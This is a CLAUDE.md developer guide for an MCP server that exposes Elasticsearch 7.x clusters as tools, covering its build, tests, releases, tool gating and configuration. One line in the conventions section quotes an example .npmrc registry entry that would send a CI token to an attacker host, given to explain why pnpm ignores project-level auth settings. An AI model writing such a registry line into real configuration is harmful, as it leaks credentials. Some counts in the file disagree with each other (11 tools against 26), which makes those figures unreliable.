# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project

MCP (Model Context Protocol) server that exposes an Elasticsearch cluster as tools to MCP clients (Claude Desktop, Cursor). Published as `elasticsearch7-mcp`; also distributed via Smithery and Docker. Communicates over **stdio only** — never write to `stdout` outside the MCP protocol; diagnostics go to `console.error`.

**This is a renamed fork of `@awesome-ai/elasticsearch-mcp`, retargeted at Elasticsearch 7.x.** See `docs/superpowers/specs/2026-08-24-elasticsearch-7x-compat-design.md` for the migration design and the verified facts behind it.

## Commands

```bash
nvm use               # Node 24.19.0 (.nvmrc) — the active LTS, which @types/node tracks
pnpm install          # pnpm ONLY — see the lockfile note below
pnpm run build        # tsc + chmod +x dist/*.js
pnpm test             # vitest run — 168 tests, mocked at the client connection layer
pnpm run test:watch   # vitest in watch mode
pnpm run typecheck    # tsc --strict over src, test and root files (vitest does NOT type-check)
pnpm run watch        # tsc --watch

# The image, as CI builds and checks it:
docker build -t elasticsearch7-mcp:dev .
printf '%s' "$HANDSHAKE" | docker run --rm -i -e ES_HOST=http://localhost:9200 elasticsearch7-mcp:dev

# Runtime verification against a real 7.x cluster (read-only by default):
ES_HOST=http://localhost:9200 ES_API_KEY=your-key pnpm run smoke

# What one tool call costs the caller's context, at cluster scale:
pnpm run build && pnpm run measure
ES_HOST=http://localhost:9200 node scripts/smoke.mjs --write smoke-test   # also write tools

# Interactive debugging:
ES_HOST=http://localhost:9200 ES_API_KEY=your-key pnpm run inspector
```

There is no linter and no formatter. Three layers of checking, all run in CI:

1. `pnpm run typecheck` — `tsc --strict`. Note the split: `pnpm run build` uses `tsconfig.json`, which covers only root files plus whatever `index.ts` reaches; `tsconfig.test.json` adds `test/**` and `src/**` explicitly. **vitest transpiles without type-checking**, so a test file's type errors are invisible until `typecheck` runs.
2. `pnpm test` — vitest against `@elastic/elasticsearch-mock`, intercepting at the client's *connection* layer. That layer matters: the tests assert the request that actually goes on the wire, so they fail when the query DSL is not nested under `body` — a faked client object would accept it silently. Verified by mutation: removing the `body` nesting or reading `docsCount` instead of `docs.count` makes 6 tests fail.
3. `pnpm run smoke` — the only check that talks to a real cluster; requires `pnpm run build` first, since it imports the built output.

## Release & publication

Published to **GitHub Packages** (`npm.pkg.github.com`) as `@agrica/elasticsearch7-mcp`,
not to npmjs.com. Two consequences that bite:

- The scope **must** equal the repository owner (`agrica`), or the registry answers 403.
- Consumers need auth even though the package is public — `npx` returns 401 without an
  `~/.npmrc` carrying a `read:packages` token. `README.md` spells this out.

`.github/workflows/ci.yml` runs on pushes to `main` and on every PR: `pnpm install
--frozen-lockfile --ignore-scripts`, `pnpm run typecheck`, `pnpm run build`,
`pnpm test`, `pnpm pack --dry-run`, then builds the Docker image and pipes an MCP
handshake into it.

`.github/workflows/release.yml` triggers on a `v*` tag push and does the release:
three guards, then publish, then a GitHub Release whose notes GitHub generates from
the commits and pull requests since the previous tag. **There is no `CHANGELOG.md`**
— release notes come from commit messages, so write them as the changelog. The guards
refuse to publish when the package scope does not match the repository owner, when the
tag disagrees with `package.json`, or when the hardcoded `McpServer` version in
`src/server.ts` disagrees with `package.json` — that last one is the drift this repo has
had before. Running the workflow manually (`workflow_dispatch`) rehearses everything as
a dry run.

To cut a release: bump `version` in `package.json` **and** the `McpServer` version in
`src/server.ts` (currently `0.1.0` in both — the release guard fails if they diverge),
commit, then `git tag vx.y.z && git push origin vx.y.z`. `secrets.GITHUB_TOKEN` covers
publication; no extra secret is needed.

## Elasticsearch version: 7.x, deliberately

The client is pinned to `@elastic/elasticsearch` `^7.17.14`. **Do not "upgrade" it to 8.x or 9.x** — that silently breaks every 7.x cluster, and the failure looks like an unrelated connection error:

- The 8.x client hardcodes `productCheck: 'Elasticsearch'` in `lib/client.js`, which requires the `x-elastic-product` response header that Elasticsearch only emits from 7.14 onward.
- It also hardcodes `compatible-with=8` media types, which a 7.x server rejects.
- Neither is exposed through `ClientOptions`; only monkey-patching the client's internals would bypass them.
- The 7.17 client's product check instead validates the `tagline` and `version.build_flavor` fields of `GET /` for servers older than 7.14 — which is exactly why it works here.

A real 8.x upgrade means re-migrating every tool, not bumping a version number.

## Architecture

Three layers, deliberately thin:

1. **`index.ts`** — bootstrap only: `loadConfigFromEnv()` → `StdioServerTransport` → `createElasticsearchMcpServer()` → connect, plus SIGINT shutdown.
2. **`src/server.ts`** — composition only. Constructs one shared `@elastic/elasticsearch` `Client`, calls the three register modules according to the config flags, and re-exports all tool functions — that re-export block is what `scripts/smoke.mjs` and any library consumer import.
3. **`src/register/*.ts`** — the registration points, one per tool set (see below). Each declares its tools via `server.tool(name, description, zodShape, handler)`; handlers are one-liners forwarding to a tool function with `esClient` as the first argument.
4. **`src/tools/*.ts`** — one file per capability, exporting plain async functions `(esClient, ...args)`. They hold all ES interaction and all response formatting.

### Three tool sets, gated at registration

| Module | Flag | Contents |
|---|---|---|
| `register/dataTools.ts` | always | the 15 read/write tools |
| `register/adminTools.ts` | `ES_ADMIN_TOOLS` | 7 read-only diagnostic tools |
| `register/destructiveTools.ts` | `ES_ALLOW_DESTRUCTIVE` | 4 irreversible tools |

The gate is **registration, not a runtime check**: a tool that is never registered is absent from `tools/list`, so the model cannot call it and it costs nothing in the caller's context. Do not "simplify" this into a guard inside the handler — that would put every destructive tool's schema back into the context of every production agent.

The diagnostic set is read-only by design, so it is safe to enable in production; that is its purpose, letting an agent explain an unhealthy index without cluster access. `delete_index_template` lives in the destructive set even though it deletes no data: leaving one delete reachable while gating the others is incoherent, and it was moved there when the sets were introduced (a surface change for anyone who used it before).

`src/tools/destructive.ts` also carries `rejectBulkTarget()`, which refuses a wildcard, a comma-separated list, `*` and `_all` **even when the flag is on** — a model that mistakes `logs-*` for one index gets a refusal and no request is sent. Keep that guard on every new destructive tool.

`src/config/schema.ts` owns config: a zod `ConfigSchema`, `createClientOptions()` (auth + TLS mapping), and `loadConfigFromEnv()`.

### The tool contract

`src/toolResult.ts` owns the contract. Every tool function is annotated `Promise<ToolResult>`, and `ToolResult` is checked against the SDK's own `CallToolResult` by a type-level assertion in that file — so an SDK change that breaks the shape fails the build rather than surfacing as a protocol error. Build failures pointing at `ToolResultMatchesProtocol` mean exactly that.

Use its two helpers instead of hand-writing fragments: `textFragment(text)` and `toolError(context, error)`. The latter logs to stderr and returns the `Error:` fragment, which is why no tool repeats that plumbing.

Tools **never throw**:

```ts
{ content: [{ type: "text", text: "..." }, ...] }
```

Errors are caught, logged with `console.error`, and returned as a `text` fragment beginning with `Error:`. This is intentional — the calling model must see the failure as readable content rather than a transport-level exception. Preserve this pattern in new tools; a throw would surface as an opaque MCP error. `scripts/smoke.mjs` depends on it too: it detects failures by scanning fragments for that prefix, and treats an actual exception as a contract violation.

Results are formatted as human/LLM-readable text (multiple fragments: a summary fragment first, then details), not as raw JSON blobs — except where the payload is genuinely structured (`listIndices`, `getMappings` stringify it).

### MCP conformance: what the specification requires and what this server does

Audited against the 2025-06-18 specification. Four points are load-bearing, and one is a deliberate deviation.

- **`isError: true` on every failure.** The specification separates protocol errors (JSON-RPC) from *tool execution* errors, which are results carrying `isError`. `toolError()` and `toolRefusal()` both set it; success omits it, since the protocol defaults it to false. A guardrail refusal counts as a failure — reporting it as a success would let a model conclude a delete had happened. `test/toolContract.test.ts` asserts the flag for all 26 tools; removing it from `toolResult.ts` fails 27 tests.
- **Every tool carries `annotations` and a `title`, via `registerTool`.** `server.tool()` is deprecated in SDK 1.30 and cannot pass either. The hints are what a client reads to decide whether to ask the user first, so they are the client-side counterpart of the registration gating — not a replacement for it, since the specification tells clients to distrust annotations from an untrusted server. `idempotentHint` is claimed only where repeating the identical call really leaves the same state: `create_index` fails when the index exists, `delete_index` 404s once it is gone, and `bulk` without an id field creates new documents each time — all four are annotated `false`, and a test enforces that.
- **Cancellation is bound to the client, not threaded through the tools.** See `src/cancellable.ts`. `withCancellation(esClient, extra.signal)` returns a Proxy whose requests abort when the client cancels; the register modules are the only place that applies it. The alternative — a trailing `signal` parameter on all 26 tool functions — would have changed every public signature that `src/server.ts` re-exports, to say one thing about the client rather than about the arguments.
- **`src/processSafetyNet.ts` tolerates exactly one stray error.** Aborting a request makes the 7.x client emit a second `RequestAbortedError` outside any promise chain, from the `product-check` EventEmitter callback in `Transport.js`; unowned, it would end the process and take the whole stdio session with it. Only that error *name* passes; anything else is logged and exits non-zero. Do not widen this into a general handler.

Two things the specification asks for that this server does not do:

- **No rate limiting.** The specification says servers *MUST* rate limit tool invocations. This is a **knowing deviation**, not an oversight. The server is spawned by, and serves, exactly one local MCP client over stdio: the client is the trust boundary, and a limiter there would throttle the operator rather than an attacker. The real hazard it would address — a `delete_by_query` or a wide `search` issued in a loop against a production cluster — is addressed instead by the registration gating (deletes are absent unless enabled), by `rejectBulkTarget()` (no wildcard target), and by the cluster's own limits. Revisit this if the server ever gains a non-stdio transport, where the caller stops being the operator.
- **`listChanged: true` is declared but never emitted.** `McpServer` hardcodes it in `registerCapabilities`, so it cannot be turned off through the public API. Harmless here: the tool list is fixed at startup by the environment flags, so there is never a change to notify about.

### Output is budgeted, and that is load-bearing

`src/outputBudget.ts` caps one tool result at `ES_MAX_RESULT_BYTES` (32 KiB by default). This is not tidiness. Measured before it existed: `list_shards` over a year of daily indices returned **385 469 bytes**, about 96 000 tokens, in one result — while the three-tier gating this project is careful about saves 6 058 bytes of *schema*. The tool list was rationed and the tool output was not.

Three rules the helper encodes, each because the alternative was worse:

- **The summary survives, the detail goes.** `budgeted({ summary, detail, hint })` keeps every summary fragment — truncating the last one with a marker if even that overruns — and fills the remainder with detail. A caller that loses the summary has lost the answer.
- **A trim is always announced,** with a hint saying how to ask a smaller question. Silence is the real hazard: a model handed a shortened list with no notice concludes the entry it wanted does not exist, which is a wrong answer rather than a partial one.
- **Detail is chunked, never one fragment.** Use `chunkedJson(records)`. The first version emitted the dump as a single fragment, so the budget dropped it whole and `verbose` answered with 145 bytes — a summary and an apology — where the caller had explicitly asked for detail. `scripts/measure-output.mjs` is what caught that.

`test/outputScale.test.ts` holds the ceilings against the same fixtures the figures came from, and `test/support/scaleFixtures.ts` is shared with the measurement script so a number in `docs/architecture-review-2026-08-24.md` can be re-run rather than rebuilt.

`list_indices` and `list_shards` put their JSON behind `verbose` (default off); `search` clamps `size` to `MAX_SEARCH_SIZE` (100) and reports the `from` to page with. `list_nodes` deliberately has no `verbose`: nodes number in the tens, so it was never the hazard, and adding a switch there would have been cargo-culting the fix.

### The 7.x client API shape

Two rules that differ from the 8.x client and that every tool follows:

- **Requests nest the DSL under `body`** — `search({ index, body: { query, size, highlight } })`, `bulk({ refresh: true, body: operations })`, `indices.create({ index, body: { settings, mappings } })`, `reindex({ wait_for_completion: false, body: { source, dest, script } })`. In `estypes`, `SearchRequest` / `ReindexRequest` mirror this with their own `body?: { … }`.
- **Responses are wrapped** — every call resolves to `{ body, statusCode, headers, warnings, meta }`, so it is always `result.body.hits`, `response.body.acknowledged`, `mappingResponse.body[index].mappings`. Forgetting `.body` usually still compiles when the response is untyped, then fails at runtime; pass the response type as the first generic (`esClient.search<estypes.SearchResponse<Record<string, any>>>(…)`) so `tsc` catches it.

### Tests

- `test/support/mockClient.ts` builds the mocked client. It pre-registers `GET /` with the real target cluster's 7.8.0 payload, because the 7.x client runs its product check there before the first request — that answer is what makes the client accept the fake cluster at all.
- **`@elastic/elasticsearch-mock` is pinned to 1.x.** 1.x extends the 7.x client's `Connection`; 2.x extends `BaseConnection`, which only the 8.x client exports, and fails at `new Mock().getConnection()`.
- That package declares an ESM `export default` in its `.d.ts` while `index.js` is CommonJS, so **no import form is constructable** for TypeScript. The helper declares the surface it uses and casts once — don't "fix" that by re-importing it elsewhere.
- Route patterns go through `find-my-way`, where `*` is a catch-all: registering `/_cat/indices/*` also swallows `/_cat/indices/log-*`. Assert on the captured request's `path` instead of registering two competing routes.
- **Provoke failures with `failEveryRoute(mock)`, not by leaving routes unregistered.** The mock answers an unknown route with 404, and `getIndexTemplate` tolerates 404 on purpose — so an unregistered route makes it look successful. `failEveryRoute` returns a 500 for every path while leaving the product check's `GET /` intact.
- **Use `firstRequest(captured)`** rather than `captured.requests[0]`: `noUncheckedIndexedAccess` rejects the raw index, and the helper fails with a message that says the tool sent no request.
- **Tests must not depend on the host.** `test/server.test.ts` points at `http://127.0.0.1:1`, which cannot be bound, so the connection is refused identically everywhere. `localhost:9200` would be wrong precisely because it is this project's documented dev endpoint — a developer running Elasticsearch locally would break the failure-path assertions.
- `test/server.test.ts` is the upgrade guard for `src/server.ts`, which the tool tests bypass. It drives a real MCP session over `InMemoryTransport` and asserts the tool list, that every tool has a description and an object input schema, and that an arbitrary query DSL survives zod validation. That last one is what catches a zod major bump silently tightening a schema. No cluster is contacted.

### Tool descriptions are the calling model's only documentation

They cost context on every session — measured at ~6.4 KB (~1.6k tokens) for the whole `tools/list` response, of which the **schemas are about two thirds**, not the prose. So the rule is not "keep descriptions short", it is: spend words only on what changes a caller's decisions, and claw the budget back from schema verbosity.

What each description must carry, because a caller cannot infer it and gets it wrong otherwise:

- `list_indices` — `pattern` is a wildcard, **not** a regex.
- `reindex` — it is **asynchronous**; the task id is the result, the copy is not done.
- `create_mapping` — it **creates the index** when absent, and cannot change an existing field's type.
- `bulk` — the index is **refreshed**, so documents are searchable at once, and per-document failures do not fail the call.
- `create_index` — it **fails** when the index exists.
- the template tools — they are the **composable** (7.8+) API, and apply only to indices created afterwards.

Do not restate what the tool name already says, and do not prefix a field description with "Optional" — the schema already carries that. `test/server.test.ts` guards the two claims most easily lost.

### Adding a tool

1. Create `src/tools/<name>.ts` exporting `async function <name>(esClient: Client, ...)`.
2. Add it to the re-export block in `src/server.ts`, then register it in the register module matching its blast radius — `dataTools` if it only reads or writes documents, `adminTools` if it is a read-only diagnostic, `destructiveTools` if it destroys anything. Use zod validators with `.describe()` on every field: those descriptions are what the client model reads to decide how to call the tool.
3. Add tests in `test/<name>.test.ts`; add the tool to the `TOOLS` table in `test/toolContract.test.ts` so the never-throws contract is checked for it too, and to the matching list in `test/server.test.ts` (`DATA_TOOLS` / `ADMIN_TOOLS` / `DESTRUCTIVE_TOOLS`) — the gating tests compare those lists against `tools/list` exactly, so a tool registered in the wrong set fails.
4. Add a check to `scripts/smoke.mjs`.
5. `pnpm run typecheck`, `pnpm test`, `pnpm run build`.

Keep the zod parameter order and the tool function's positional parameter order in sync mentally — they intentionally differ in `reindex` (schema is `query, script`; the function takes `script, query`), which is easy to break silently since both are `Record<string, any>`.

## Conventions & gotchas

- **TypeScript 7** (the native port) builds this project with no source or config changes; `tsconfig.json` keeps `module`/`moduleResolution: Node16`, `strict` and `declaration` as they were.
- **Request bodies and public signatures are typed with `estypes`**, not `Record<string, any>`: `estypes.MappingTypeMapping`, `IndicesIndexSettings`, `QueryDslQueryContainer`, `Script`, and `NonNullable<estypes.XRequest["body"]>` for the bodies. That is what makes a misspelt key (`body.dest.indx`) a compile error instead of a cluster error. Do not widen these back to `any` for convenience.
- **`createClientOptions` takes `ElasticsearchConfigInput` (`z.input`), not `ElasticsearchConfig` (`z.output`).** It validates its own argument, so callers pass the pre-transform shape where `urls` may be a single string. Using the output type there is what forced `as any` at every call site.
- **`exactOptionalPropertyTypes` is deliberately off.** The other five hardening flags (`noUncheckedIndexedAccess`, `noUnusedLocals`, `noUnusedParameters`, `noImplicitReturns`, `noFallthroughCasesInSwitch`) are on. `exactOptionalPropertyTypes` conflicts with the ES client's generated types, which declare optionals without `| undefined`: enabling it buys casts at every boundary, not safety.
- **`.js` extensions are mandatory** on all relative imports (`./src/server.js`, `./tools/search.js`). `module`/`moduleResolution` are `Node16` with `"type": "module"`.
- **`zod` is a direct dependency, on v4.** It used to resolve transitively through `@modelcontextprotocol/sdk`; the SDK now declares it as a non-optional peer (`^3.25 || ^4.0`), so it is pinned here explicitly. Its other peer, `@cfworker/json-schema`, is optional and deliberately absent.
- **zod 4 requires a key schema on records**: `z.record(z.any())` is invalid, it must be `z.record(z.string(), z.any())`. All eight call sites in `src/server.ts` use the two-argument form — reverting one compiles nowhere, but copying the old idiom from an example will.
- **`@types/node` tracks the `.nvmrc` major, not the newest release.** Node 26 exists but is Current, not LTS; `.nvmrc` is on 24 (LTS "Krypton"), so `@types/node` stays on 24.x. Bumping types past the runtime would type-check against APIs the target Node does not have.
- **`tsconfig.json` has `include: ["*.ts"]`** — only root-level files are entry points. `src/**` is compiled solely because it is reachable from `index.ts`. A new file under `src/` that nothing imports is never type-checked. `rootDir: "./"` means output is `dist/index.js` + `dist/src/**`, matching the `bin`/`main` entry. `scripts/smoke.mjs` is plain JS and is deliberately outside the build.
- **English throughout.** User-facing strings and comments are English in every file. The project used to mix in Chinese (and shipped a `README.zh-CN.md`); do not reintroduce either.
- **Docs to keep in step.** Feature/config changes need updating in `README.md` and — if a config option changes — `smithery.yaml` (which maps camelCase Smithery config keys onto `ES_*` env vars) and `Dockerfile` env defaults.
- **The Docker image is built and checked in CI, and pushed to GHCR on a tag.** `Dockerfile` is multi-stage: the build stage installs dev dependencies and runs `tsc`, the runtime stage installs `--omit=dev` and copies only `dist/`. It `COPY`s `tsconfig.json`, `index.ts` and `src/` by name rather than `COPY . .`, so a stray local file cannot end up in the image.
- **`.dockerignore` is load-bearing, not hygiene.** CI installs before the Docker build, so without it `node_modules/` and `dist/` from the runner would be copied into the build context and over the image's own. Under pnpm this is worse than a stale tree: `node_modules` is a forest of symlinks into `node_modules/.pnpm`, which does not exist inside the image, so the copy breaks outright rather than merely being wrong.
- **The Node major lives in two places**: `.nvmrc` (used by `setup-node` and the scripts) and the `Dockerfile` base tag, pinned to `node:24-alpine` rather than the floating `node:lts-alpine` so the image runs what the project is type-checked against. Bump them together.
- **`scripts/check-mcp-tools.mjs`** asserts a `tools/list` response holds exactly the 11 tools, each with a description and an input schema. CI pipes a three-line JSON-RPC handshake into the container and runs it, which is what proves the image serves the protocol rather than merely building. It reads any response file, so it works against `node dist/index.js` locally too.
- **pnpm only, and one lockfile.** `packageManager: "pnpm@11.22.0"` pins the version; `pnpm-lock.yaml` is the only lockfile, and `.dockerignore` blocks `package-lock.json` and `yarn.lock` from the build context so a stray one cannot reach it. Installing with npm writes a second lockfile that nothing reads and a flat tree nothing was tested against — pnpm's isolated layout is stricter, so a dependency that is used but not declared fails here and would have passed under npm.
- **pnpm ignores auth settings in a project `.npmrc`,** by design: a repository could otherwise write `registry=https://attacker.example/${CI_TOKEN}/` and exfiltrate the token during resolution. So the repo's `.npmrc` carries only `@agrica:registry=…`, no `_authToken` line — one there would be silently dropped, not merely redundant.
- **Publication authenticates through the environment, not a file.** `release.yml` runs `env "pnpm_config_//npm.pkg.github.com/:_authToken=$PACKAGES_TOKEN" pnpm publish`, the file-free form pnpm added in 11.6. The registry is encoded in the variable *name*, which is the trusted part — nothing in the repository can point that credential at another host. The registry actually published to comes from `publishConfig` in `package.json`. `NODE_AUTH_TOKEN` and `setup-node`'s `registry-url` are kept as a fallback: that npmrc is user-level, so pnpm does expand it. Verified locally with `pnpm config get`, which returns the value with the variable set and `undefined` without.
- **`pnpm publish` needs `--no-git-checks` in CI.** A tag push checks out a detached HEAD, and pnpm refuses to publish from one. The flag is in `release.yml` for that reason, not as a way around a dirty tree.

### Configuration

`ES_HOST` (comma-separated for multiple nodes → `nodes[]` for failover/load balancing), `ES_API_KEY`, `ES_USERNAME`/`ES_PASSWORD`, `ES_CA_CERT` (→ `ssl.ca`; the 7.x client calls this option `ssl`, not `tls`). Each has an un-prefixed legacy fallback (`HOST`, `API_KEY`, `USERNAME`, …) kept for backward compatibility. Auth precedence: API key wins; basic auth applies only when *both* username and password are non-empty.

`ES_REQUEST_TIMEOUT`, `ES_MAX_RETRIES` and `ES_MAX_RESULT_BYTES` are numeric. A malformed value is reported to stderr and ignored rather than fatal: refusing to start because `ES_MAX_RETRIES=three` would take the session down over a setting with a sane fallback. `loadConfigFromEnv()` returns `ElasticsearchConfigInput`, not the validated type, precisely so an unset number can come back `undefined` and let zod's `.default()` stay the single place each default is written.

`ES_INSTANCE_LABEL` is free text and purely cosmetic — it becomes `serverInfo.title` (`Elasticsearch 7.x — production`) and is echoed to stderr at startup. It exists because a real `mcpServers` block usually declares this server once per cluster, and without it a client shows two identically named servers. It has no effect on behaviour: do not make anything depend on it, in particular not the destructive gate, which is `ES_ALLOW_DESTRUCTIVE` and nothing else.

`ES_ADMIN_TOOLS` and `ES_ALLOW_DESTRUCTIVE` accept `true` or `1` (case-insensitive, trimmed); anything else, unset included, is off. They deliberately have **no un-prefixed fallback** — an ambient `ADMIN_TOOLS` deciding whether deletes are reachable is exactly the `USERNAME` hazard below, with worse consequences.

Note when developing on Windows: `process.env.USERNAME` is always set by the OS, so the legacy `USERNAME` fallback silently picks up your Windows account name. It's harmless today only because the password stays empty and the `username && password` guard fails — keep that guard intact.

Config is validated lazily: `ConfigSchema.parse()` runs inside `createClientOptions()`, so a missing or malformed `ES_HOST` surfaces as a zod URL error at startup via `main()`'s catch (`Server error: ...`).

### Behavioral details worth knowing

- `search` fetches the index mapping first and auto-injects a `highlight` block for every `text` field (`<em>` tags). Highlighted fields are rendered before non-highlighted `_source` fields. `dense_vector` fields are excluded: Elasticsearch cannot highlight a vector. The old condition (`"dense_vector" in fieldData`) tested for a *key* of that name, which no mapping has, so it never matched — the documentation claimed a behaviour the code never had.
- `bulk` uses `refresh: true`, so imported docs are immediately searchable; per-document failures are reported individually rather than failing the call.
- `reindex` uses `wait_for_completion: false` and returns a task ID for `GET _tasks/<id>`.
- **`delete_by_query` does the same, and this is a correctness fix rather than a preference.** Run synchronously it blocked until Elasticsearch finished; past the request timeout it reported `Error: Request timed out` while the cluster carried on deleting — telling the model a destructive operation had failed while it was succeeding, and inviting a retry against a moving target. It returns a task id; the deleted count now lives in the task document, so `get_task` is where it is read. **Surface change:** the result no longer carries a count.
- `bulk` caps `documents` at `MAX_BULK_DOCUMENTS` (1000) and takes `refresh`, defaulting true. Always-refreshing is right for the small interactive import a model makes — it can verify its own work — and wrong for a bulk load, where forcing a refresh per batch is the expensive part.
- `create_mapping` creates the index if it doesn't exist, otherwise calls `putMapping`, and always echoes the resulting mapping back. It relies on the 7.x client casting `HEAD` responses to a boolean — `indices.exists<boolean>()` returns `body: false` on 404 instead of throwing. Keep the explicit `<boolean>` generic: without it the response type is `Record<string, any>`, which is always truthy.
- `get_index_template` passes `{ ignore: [404] }`, so a missing named template yields the "No template found" message instead of an `Error:` fragment. Elasticsearch answers 404 there, not an empty list — without the option that friendly message was unreachable code.
- `list_indices` passes `pattern` straight to `cat.indices`, so it is an ES **wildcard** (`log-*`), defaulting to `*` — the tool description used to claim regex support, and `test/server.test.ts` now fails if that claim comes back. It requests `bytes: "b"` and reads the dotted keys `docs.count` / `store.size`: the camelCase aliases in `estypes` are type-level only and `undefined` at runtime.
